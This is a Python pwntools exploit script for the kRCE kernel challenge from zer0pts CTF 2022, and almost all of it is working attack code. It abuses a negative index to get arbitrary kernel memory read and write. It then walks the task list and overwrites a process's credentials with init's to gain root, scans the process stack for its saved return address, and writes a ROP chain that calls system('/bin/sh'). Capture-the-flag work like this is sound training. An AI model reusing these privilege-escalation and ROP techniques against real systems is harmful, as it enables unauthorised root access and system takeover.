#!/usr/bin/env python

from binascii import hexlify
from enum import IntFlag
from pwn import *

context.arch = "amd64"

io = process("./start-qemu.sh")

io.recvuntil(b"[ kRCE - zer0pts CTF 2022 ]")


class SomethingWentWrongException(Exception):
    pass


def result_line_pred(line: bytes) -> bool:
    return line.startswith(b"[+]") or line.startswith(b"[-]")


def add(index, size) -> None:
    assert index >= 0, "Illegal index value"

    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"index: ", str(index).encode("ascii"))
    io.sendlineafter(b"size: ", str(size).encode("ascii"))

    result_line = io.recvline_pred(result_line_pred)
    if not result_line.startswith(b"[+]"):
        raise SomethingWentWrongException


def edit(index, data) -> None:
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"index: ", str(index).encode("ascii"))
    io.sendlineafter(b"size: ", str(len(data)).encode("ascii"))
    io.sendlineafter(b"data: ", hexlify(data))

    result_line = io.recvline_pred(result_line_pred)
    if not result_line.startswith(b"[+]"):
        raise SomethingWentWrongException


def show(index, size) -> bytes:
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"index: ", str(index).encode("ascii"))
    io.sendlineafter(b"size: ", str(size).encode("ascii"))

    result_line = io.recvline_pred(result_line_pred)
    if not result_line.startswith(b"[+]"):
        raise SomethingWentWrongException

    data_idx = result_line.find(b"Data: ") + len(b"Data: ")
    data = bytes(int(s, base=16) for s in result_line[data_idx:].split())
    return data


def delete(index) -> None:
    assert index >= 0, "Illegal index value"

    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"index: ", str(index).encode("ascii"))

    result_line = io.recvline_pred(result_line_pred)
    if not result_line.startswith(b"[+]"):
        raise SomethingWentWrongException


module_fops_index = -128
sizeof_struct_module = 0x2c0

info("Setting up 2 buffers trick")
this_module = show(module_fops_index, sizeof_struct_module)
cleanup_module_addr = u64(this_module[0x2a0: 0x2a8])
buffer_addr = cleanup_module_addr + 0x2205
edit(module_fops_index, this_module + p64(buffer_addr + 8))


def abs_write(addr: int, data: bytes):
    edit(0, p64(addr))
    edit(1, data)


def abs_read(addr: int, size: int) -> bytes:
    edit(0, p64(addr))
    return show(1, size)


def abs_read_ptr(addr: int) -> int:
    return u64(abs_read(addr, 8))


cdev_del_disp = u32(abs_read(cleanup_module_addr + 0xc, 4), sign="signed")
cdev_del_addr = cdev_del_disp + cleanup_module_addr + 0x10
info(f"cdev_del address: {hex(cdev_del_addr)}")

# weird ptr: ffffffff81e12870
# cdev_del : ffffffff8114e240

init_proc_list_addr = cdev_del_addr + 0xcc4340

task_struct_list_entry_offset = 0x2f0
task_struct_mm_offset = 0x340
task_struct_real_cred_offset = 0x5b0
task_struct_cred_offset = 0x5b8

mm_struct_exe_file_offset = 0x380
mm_struct_vma_offset = 0x0
mm_struct_start_stack_offset = 0x120

file_struct_f_path_offset = 0x10

path_struct_dentry_offset = 0x8

dentry_struct_d_name_offset = 0x20

vm_area_struct_vm_next_offset = 0x10
vm_area_struct_start_offset = 0x0
vm_area_struct_end_offset = 0x8
vm_area_struct_flags_offset = 0x50
vm_area_struct_file_offset = 0xa0
vm_area_struct_vm_mm_offset = 0x40


def get_next_task(task_addr: int) -> int:
    return abs_read_ptr(task_addr + task_struct_list_entry_offset) - task_struct_list_entry_offset


def read_qstr(qstr_addr: int) -> int:
    length = u32(abs_read(qstr_addr + 4, 4))
    ptr = abs_read_ptr(qstr_addr + 8)
    if length != 0 and ptr != 0:
        return abs_read(ptr, length)
    return b""

def read_file_basename(file_ptr: int) -> bytes:
    f_path_addr = file_ptr + file_struct_f_path_offset
    dentry_addr = abs_read_ptr(f_path_addr + path_struct_dentry_offset)
    if dentry_addr == 0:
        return b""

    d_name_addr = dentry_addr + dentry_struct_d_name_offset
    d_name = read_qstr(d_name_addr)
    return d_name

curr_entry = init_proc_list_addr
interface_task_struct = None

info("Dumping task list...")

while True:
    debug("-"*50)
    curr_entry = get_next_task(curr_entry)
    if curr_entry == init_proc_list_addr:
        break

    debug(f"curr: {hex(curr_entry)}")

    mm_addr = abs_read_ptr(curr_entry + task_struct_mm_offset)
    debug(f"mm_addr: {hex(mm_addr)}")
    if mm_addr == 0:
        continue

    exe_file_addr = abs_read_ptr(mm_addr + mm_struct_exe_file_offset)
    debug(f"exe_file: {hex(exe_file_addr)}")
    if exe_file_addr == 0:
        continue

    d_name = read_file_basename(exe_file_addr)
    debug(f"d_name = {d_name}")

    if d_name == b"interface":
        interface_task_struct = curr_entry
        break
debug("-"*50)

assert interface_task_struct is not None, "Couldn't find interface task_struct"

info(f"interface task struct {hex(interface_task_struct)}")

init_task_struct = get_next_task(init_proc_list_addr)
info(f"init task struct {hex(interface_task_struct)}")

init_real_creds = abs_read_ptr(init_task_struct + task_struct_real_cred_offset)
info(f"init real_creds {hex(init_real_creds)}")

info("Overriding interface creds...")
abs_write(interface_task_struct + task_struct_real_cred_offset, p64(init_real_creds))
abs_write(interface_task_struct + task_struct_cred_offset, p64(init_real_creds))

info("I am now root.")

class VMAFlags(IntFlag):
    VM_READ = 0x00000001
    VM_WRITE = 0x00000002
    VM_EXEC = 0x00000004
    VM_SHARED = 0x00000008
    VM_MAYREAD = 0x00000010
    VM_MAYWRITE = 0x00000020
    VM_MAYEXEC = 0x00000040
    VM_MAYSHARE = 0x00000080
    VM_GROWSDOWN = 0x00000100
    VM_UFFD_MISSING = 0x00000200
    VM_PFNMAP = 0x00000400
    VM_UFFD_WP = 0x00001000
    VM_LOCKED = 0x00002000
    VM_IO = 0x00004000
    VM_SEQ_READ = 0x00008000
    VM_RAND_READ = 0x00010000
    VM_DONTCOPY = 0x00020000
    VM_DONTEXPAND = 0x00040000
    VM_LOCKONFAULT = 0x00080000
    VM_ACCOUNT = 0x00100000
    VM_NORESERVE = 0x00200000
    VM_HUGETLB = 0x00400000
    VM_SYNC = 0x00800000
    VM_ARCH_1 = 0x01000000
    VM_WIPEONFORK = 0x02000000
    VM_DONTDUMP = 0x04000000


interface_mm_addr = mm_addr
curr_vma = abs_read_ptr(interface_mm_addr + mm_struct_vma_offset)
interface_start_stack = abs_read_ptr(interface_mm_addr + mm_struct_start_stack_offset)

info("Dumping interface vmas...")

interface_binary_base = None
interface_end_stack = None
libc_base = None

while curr_vma != 0:
    debug("-"*50)
    debug(f"curr_vma: {hex(curr_vma)}")

    start = abs_read_ptr(curr_vma + vm_area_struct_start_offset)
    debug(f"start: {hex(start)}")

    end = abs_read_ptr(curr_vma + vm_area_struct_end_offset)
    debug(f"end: {hex(end)}")

    flags = VMAFlags(abs_read_ptr(curr_vma + vm_area_struct_flags_offset))
    debug(f"flags: {flags!r}")

    file_basename = b"[unknown]"

    file_addr = abs_read_ptr(curr_vma + vm_area_struct_file_offset)
    if file_addr != 0:
        file_basename = read_file_basename(file_addr)
    elif interface_start_stack >= start and interface_start_stack <= end:
        file_basename = b"[stack]"
    debug(f"file: {file_basename}")

    if file_basename == b"interface" and interface_binary_base is None:
        interface_binary_base = start
    elif file_basename == b"libuClibc-1.0.40.so" and libc_base is None:
        libc_base = start
    elif file_basename == b"[stack]" and interface_end_stack is None:
        interface_end_stack = end

    curr_vma = abs_read_ptr(curr_vma + vm_area_struct_vm_next_offset)
debug("-"*50)

assert libc_base is not None, "Couldn't find libc!"
assert interface_binary_base is not None, "Couldn't find interface!"
assert interface_end_stack is not None, "Couldn't find interface stack!"

interface_cmd_ret = interface_binary_base + 0x1810
info(f"Scanning the stack for {hex(interface_cmd_ret)}...")

for page_start in range(interface_start_stack & 0xfffffffffffff000, interface_end_stack, 0x1000):
    debug(f"Reading stack page {hex(page_start)}...")
    page = abs_read(page_start, 0x1000)
    offset = page.find(p64(interface_cmd_ret))
    if offset != -1:
        saved_rip_addr = page_start + offset
        break
else:
    assert 0, "Couldn't find saved rip in interface stack!"

info(f"Found saved rip addr: {hex(saved_rip_addr)}")
info("ropping...")

system_addr = libc_base + 0x45a92
pop_rdi_ret_addr = libc_base + 0x19e64
binsh_addr = libc_base + 0x5d52e

chain = p64(pop_rdi_ret_addr)
chain += p64(binsh_addr)
chain += p64(system_addr)

abs_write(saved_rip_addr, chain)

info("Done! should have shell now")

io.interactive()
